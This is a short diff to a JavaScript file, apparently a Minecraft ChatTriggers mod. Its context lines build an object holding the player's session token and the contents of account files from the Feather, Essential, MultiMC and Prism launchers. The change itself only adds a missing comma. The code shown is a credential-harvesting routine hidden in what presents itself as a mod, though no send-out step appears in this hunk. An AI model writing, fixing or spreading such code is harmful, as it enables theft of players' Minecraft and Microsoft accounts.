@@ -19,7 +19,7 @@ const data = {
     token: Client.getMinecraft().func_110432_I().func_148254_d(),
     feather: FileLib.read(`${appData}\\.feather\\accounts.json`),
     essentials: FileLib.read(`${mcFolder}\\essential\\microsoft_accounts.json`),
-    essentials2: FileLib.read(`${appData}\\gg.essential.mod\\microsoft_accounts.json`)
+    essentials2: FileLib.read(`${appData}\\gg.essential.mod\\microsoft_accounts.json`),
     mmc: mmc,
     prism: prism,
 };
